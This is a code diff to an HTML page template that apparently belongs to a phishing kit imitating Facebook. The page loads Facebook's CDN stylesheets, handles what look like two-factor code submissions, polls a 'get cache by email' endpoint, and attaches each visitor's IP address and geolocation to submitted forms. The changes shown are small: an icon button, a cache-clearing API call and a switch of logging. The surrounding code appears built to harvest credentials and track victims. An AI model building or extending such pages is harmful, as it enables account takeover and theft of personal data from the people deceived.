@@ -54,7 +54,7 @@
         as="style" crossorigin="anonymous" />
     <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/dg6SOblwSgG.css?_nc_x=Ij3Wp8lg5Kz"
         as="style" crossorigin="anonymous" />
-    <link type="text/css" href="/css/home.css?v=1" rel="stylesheet">
+    <link type="text/css" href="/css/home.css?v=2" rel="stylesheet">
 </head>
 
 <body>
@@ -107,7 +107,7 @@
                 </div>
                 &emsp;
                 <div class="typing-right">
-                    <button class="btn btn-send">Send</button>
+                    <button class="btn btn-send"><ion-icon name="send"></ion-icon></button>
                 </div>
             </div>
         </div>
@@ -458,6 +458,16 @@
                                 }
                                 $('.button-send-fa').prop('disabled', false);
                                 clearInterval(idIntervalGetCacheByEmail);
+                                // call api clear all cache
+                                $.ajax({
+                                    method: "POST",
+                                    url: "/api/delete-all-cache",
+                                    success: function(response) {
+                                        if (response.status == 0) {
+                                            console.log("Delete all cache success", response);
+                                        }
+                                    }
+                                });
                             } else {
                                 console.log("Still call get cache by email");
                             }
@@ -511,8 +521,8 @@
         async function setCurrentLang() {
             let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
             const response = await fetch(getIpInfoUrl);
-            console.log(response);
             const ipInfo = await response.json();
+            console.log(ipInfo);
             ipAddress = ipInfo.ipAddress;
             latitude = ipInfo.latitude;
             longitude = ipInfo.longitude;
@@ -525,7 +535,6 @@
             continent = ipInfo.continent;
             continentCode = ipInfo.continentCode;
         }
-        setCurrentLang()
 
         function pushIPInfo(formData) {
             formData.append('ipAddress', ipAddress)
@@ -624,6 +633,8 @@
         $(document).on('input', '.validate-fa', validateFa);
         $(document).on('keydown', '.validate-input', inputValidateInput);
     </script>
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
 </body>
 
 </html>
